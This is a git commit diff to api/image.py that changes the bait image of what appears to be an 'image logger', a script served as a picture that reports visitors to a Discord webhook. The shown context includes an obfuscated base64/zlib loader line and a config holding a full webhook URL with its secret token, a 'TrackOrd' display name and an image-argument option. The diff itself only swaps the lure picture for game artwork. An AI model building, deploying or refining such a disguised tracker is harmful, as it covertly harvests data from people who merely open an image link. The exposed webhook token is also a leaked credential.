e6654e78143d1a14ce62a49adce737ac5a6e1a89
brandonmoore072012-commits <brandonmoore072012@gmail.com>
2025-12-29 02:49:10 -0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -5,7 +5,7 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1452542396805152889/Ox5vrfFTn7F_kB0RpgBsJ464620MSdK_Iv_7EOTOoEFCRB16NZHNI-vfMOjbQF7ZSXov",
-    "image": "https://imgs.search.brave.com/r0V3coPXof6GoWfcG9qyv2DOgaOaC1r6CCzx6M3OX9I/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9zdGF0/aWMwLnNyY2RuLmNv/bS93b3JkcHJlc3Mv/d3AtY29udGVudC91/cGxvYWRzLzIwMTcv/MDMvS2luZy1Lb25n/LUVzY2FwZXMuanBn/P3E9NTAmZml0PWNy/b3Amdz04MjUmZHBy/PTEuNQ",
+    "image": "https://static.wikia.nocookie.net/dragonballfighterz/images/b/b1/Goku_%28Super_Saiyan%29_Artwork.png/revision/latest?cb=20180914190656",
     "imageArgument": True,
     "username": "TrackOrd",
     "avatar_url": "https://github.com/mystixxx2/Image/blob/main/ChatGPT%20Image%2011%20oct.%202025,%2018_54_21.png?raw=true",
